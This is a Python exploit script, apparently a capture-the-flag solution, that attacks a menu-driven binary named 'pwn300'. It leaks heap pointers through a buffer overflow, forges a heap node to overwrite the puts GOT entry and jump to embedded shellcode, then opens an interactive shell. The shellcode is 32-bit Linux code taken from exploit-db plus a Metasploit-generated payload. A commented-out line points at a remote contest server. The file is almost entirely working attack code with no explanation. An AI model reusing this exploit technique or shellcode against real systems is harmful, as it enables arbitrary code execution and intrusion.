from zio import *
from pwn import *
context(arch = 'i386', os = 'linux')

target = "./pwn300"

#target = ("133.130.90.210", 6666)
def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def add_a_girl(io, type_t):
	io.read_until("Your Choice:\n")
	io.write("1\n")
	io.read_until("Give the type of the Girl:\n")
	io.write(str(type_t) + "\n")

def delete_a_girl(io, id_t):
	io.read_until("Your Choice:\n")
	io.write("2\n")
	io.read_until("Give the Girl id to delete:\n")
	io.write(str(id_t) + "\n")
	
def edit_a_girl(io, id_t, type_t, info):
	io.read_until("Your Choice:\n")
	io.write("3\n")
	io.read_until("Give the Girl id to edit:\n")
	io.write(str(id_t) + "\n")
	io.read_until("Give the type to edit:\n")
	io.write(str(type_t) + "\n")
	io.read_until("Give your Girl:\n")
	io.write(info)
	
def show_a_girl(io, id_t):
	io.read_until("Your Choice:\n")
	io.write("4\n")
	io.read_until("Give the Girlid to print:\n")
	io.write(str(id_t) + "\n")


def pwn(io):
	add_a_girl(io, 1)
	add_a_girl(io, 1)
	add_a_girl(io, 1)
	add_a_girl(io, 1)
	edit_a_girl(io, 0, 2, 'p'*216)
	edit_a_girl(io, 1, 2, 'end')
	edit_a_girl(io, 2, 2, 'p'*216)
	edit_a_girl(io, 3, 2, 'end')

	show_a_girl(io, 0)
	data = io.read_until("end\n")[216:-4]
	next_ptr = l32(data[:4])
	pre_ptr = l32(data[4:])
	print "next_ptr:", hex(next_ptr)
	print "pre_ptr :", hex(pre_ptr)


	#'\xeb\x0e' jmp 0x10
	jmp_code = '\xeb\x0e'

	#shellcode for linux 32 bit
 	#https://www.exploit-db.com/exploits/37393/
 	shellcode = "\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x90\x90\x90\x68\x58\xc1\xe8\x10\xc1\xe8\x08\x50\x68\x2f\x64\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80\xb0\x01\xb3\x01\xcd\x80"
 	
	#in msfconsole: generate -b "x00\x0f\x0a\x0b" -t python
	shellcode =  ""
	shellcode += "\xbe\xe4\x90\x39\xc2\xda\xcf\xd9\x74\x24\xf4\x5a\x29"
	shellcode += "\xc9\xb1\x0b\x83\xea\xfc\x31\x72\x11\x03\x72\x11\xe2"
	shellcode += "\x11\xfa\x32\x9a\x40\xa9\x22\x72\x5f\x2d\x22\x65\xf7"
	shellcode += "\x9e\x47\x02\x07\x89\x88\xb0\x6e\x27\x5e\xd7\x22\x5f"
	shellcode += "\x68\x18\xc2\x9f\x46\x7a\xab\xf1\xb7\x09\x43\x0e\x9f"
	shellcode += "\xbe\x1a\xef\xd2\xc1"
 	shellcode = jmp_code.ljust(16, '\x90') + shellcode


	puts_got = 0x0804b014
	node0_heap_addr = pre_ptr
	shellcode_addr = node0_heap_addr + 3*4
	node1_heap_addr = pre_ptr + (next_ptr - pre_ptr) / 2
	print "node1_heap_addr:", hex(node0_heap_addr)
	print "node0_heap_addr:", hex(node0_heap_addr)
	print "shellcode_addr:", hex(shellcode_addr)

	fake_node = l32(0x10101010) + l32(shellcode_addr) + l32(puts_got - 4) + l32(0x10101010) + l32(0x30303030)
	payload = shellcode.ljust(216 - 8, 'a') + fake_node
	io.gdb_hint()
	edit_a_girl(io, 0, 2, payload)

	delete_a_girl(io, 1)
	#show_a_girl(io, 0)

	#print [c for c in data]
	io.interact()

io = get_io(target)
pwn(io)
